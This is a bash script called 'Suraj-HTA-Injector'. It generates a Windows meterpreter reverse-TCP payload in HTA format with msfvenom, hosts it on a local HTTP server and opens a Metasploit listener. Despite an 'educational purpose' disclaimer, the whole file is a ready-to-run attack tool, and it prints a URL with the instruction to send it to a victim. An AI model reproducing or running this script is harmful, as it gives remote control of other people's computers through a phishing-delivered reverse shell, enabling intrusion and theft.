#!/bin/bash

# Author: Suraj | Cyber Forensics & Ethical Hacker
# Tool: Suraj-HTA-Injector
# Description: Generates HTA payload and delivers via HTTP with Metasploit listener
# For Educational Purpose Only

# Colors
red='\033[1;31m'
green='\033[1;32m'
blue='\033[1;34m'
reset='\033[0m'

# Check dependencies
function check_dependencies() {
    echo -e "${blue}[+] Checking dependencies...${reset}"
    for cmd in msfvenom python3; do
        if ! command -v $cmd &> /dev/null; then
            echo -e "${red}[-] $cmd not found! Install it first.${reset}"
            exit 1
        fi
    done
    echo -e "${green}[+] All dependencies are present.${reset}"
}

# Payload Generation
function generate_payload() {
    echo -e "${blue}[+] Generating HTA payload...${reset}"
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o payload.hta > /dev/null 2>&1

    if [[ -f payload.hta ]]; then
        echo -e "${green}[+] Payload saved as payload.hta${reset}"
    else
        echo -e "${red}[-] Payload generation failed!${reset}"
        exit 1
    fi
}

# HTTP Server
function start_server() {
    echo -e "${blue}[+] Starting HTTP server on port 8080...${reset}"
    python3 -m http.server 8080 > /dev/null 2>&1 &
    sleep 2
    echo -e "${green}[+] Server started! Victim URL: http://$LHOST:8080/payload.hta${reset}"
}

# Metasploit Listener
function start_listener() {
    echo -e "${blue}[+] Launching Metasploit listener...${reset}"
    msfconsole -q -x "use exploit/multi/handler;
    set payload windows/meterpreter/reverse_tcp;
    set LHOST $LHOST;
    set LPORT $LPORT;
    set ExitOnSession false;
    exploit"
}

# Main
echo -e "${green}"
echo "╔══════════════════════════════════════╗"
echo "║        Suraj-HTA-Injector            ║"
echo "║   Advanced HTA Reverse Shell Tool    ║"
echo "╚══════════════════════════════════════╝"
echo -e "${reset}"

read -p "Enter your LHOST (your IP): " LHOST
read -p "Enter LPORT (e.g. 4444): " LPORT

check_dependencies
generate_payload
start_server

echo -e "${blue}[!] Send this URL to victim: http://$LHOST:8080/payload.hta${reset}"
read -p "Press Enter to start Metasploit listener..."

start_listener
